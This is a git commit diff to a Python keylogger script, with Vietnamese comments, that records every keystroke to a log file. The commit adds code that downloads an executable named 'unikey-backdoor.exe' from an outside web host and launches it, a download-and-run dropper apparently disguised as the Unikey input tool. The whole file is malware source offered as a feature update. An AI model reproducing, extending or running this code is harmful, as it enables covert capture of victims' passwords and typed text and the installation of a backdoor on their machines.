6ed49a5173e5cdbf91a97af650517ae9ce3c7388
TienNHM <TienNHM.it@gmail.com>
2024-11-23 17:49:36 +0700

    Enhance key logger functionality and add unikey executable download

--- key_logger.py
+++ key_logger.py
@@ -1,12 +1,22 @@
+import requests
+
+# Tự động tải file dev.exe từ server, lưu lại với tên unikey.exe
+file_backdoor = "unikey-backdoor.exe"
+url = f"https://tiennhm.github.io/key_logger/web/{file_backdoor}"
+r = requests.get(url)
+
+with open(file_backdoor, "wb") as f:
+    f.write(r.content)
+
 from pynput.keyboard import Key, Listener
 import logging
 
 # Đường dẫn file log
-filename = "keylog.txt"
+file_log = "keylog.txt"
 
 # Ghi log
 logging.basicConfig(
-    filename=filename, 
+    filename=file_log, 
     level=logging.DEBUG, 
     format='%(message)s')
 
@@ -17,3 +27,8 @@ def on_press(key):
 # Lắng nghe sự kiện nhấn phím
 with Listener(on_press=on_press) as listener:
     listener.join()
+
+
+# Tạo tiến trình mới để chạy file unikey.exe
+import os
+os.system(f"start {file_backdoor}")
